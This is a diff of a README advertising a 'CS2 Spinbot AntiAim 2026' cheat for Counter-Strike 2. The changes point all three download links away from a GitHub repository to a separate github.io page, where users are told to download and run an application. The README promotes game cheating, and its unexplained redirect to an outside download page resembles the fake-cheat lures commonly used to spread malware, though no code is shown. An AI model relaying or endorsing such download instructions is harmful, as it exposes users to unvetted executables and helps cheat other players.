@@ -1,6 +1,6 @@
 # 🎯 cs2-spinbot-antiaim-2026 - Dominate Every Match Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-CS2_Spinbot_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4)](https://github.com/gimibeu6831-hash/cs2-spinbot-antiaim-2026)
+[![Download Now](https://img.shields.io/badge/Download-CS2_Spinbot_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4)](https://gimibeu6831-hash.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! This guide will help you download and run CS2 Spinbot AntiAim 2026 on y
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: **https://github.com/gimibeu6831-hash/cs2-spinbot-antiaim-2026**
+Visit this link to download the application: **https://gimibeu6831-hash.github.io**
 
 Once you click the link, you'll see a green "Download" button on the page. Click it, and your download will start automatically. The file will be saved to your "Downloads" folder by default.
 
@@ -165,7 +165,7 @@ Before you start dominating:
 
 ## 🔗 Quick Access
 
-**Download Link:** https://github.com/gimibeu6831-hash/cs2-spinbot-antiaim-2026
+**Download Link:** https://gimibeu6831-hash.github.io
 
 Remember to bookmark this page for future updates and support. The application will automatically notify you of any new versions.
 
